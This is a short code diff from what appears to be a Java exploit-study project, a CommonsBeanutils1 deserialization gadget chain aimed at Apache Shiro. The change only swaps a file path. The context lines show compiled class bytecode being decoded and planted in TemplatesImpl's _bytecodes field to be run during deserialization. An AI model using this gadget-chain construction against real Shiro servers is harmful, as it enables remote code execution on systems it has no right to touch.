@@ -36,7 +36,8 @@ public class CB1withoutCCforshiro {
         return encodedText;
     }
     public static void main(String args[]) throws Exception {
-        String bytecode=bytecode("C:\\Users\\CWM\\IdeaProjects\\test\\src\\main\\java\\com\\sec\\cwm\\base\\HelloTempImpl.class");
+//        String bytecode=bytecode("C:\\Users\\CWM\\IdeaProjects\\test\\src\\main\\java\\com\\sec\\cwm\\base\\HelloTempImpl.class");
+        String bytecode=bytecode("/home/cwm/IdeaProjects/javastudy/target/classes/HelloTempImpl.class");
         byte[] code = Base64.getDecoder().decode(bytecode);
         TemplatesImpl templates=new TemplatesImpl();
         setFieldValue(templates,"_bytecodes",new byte[][]{code});
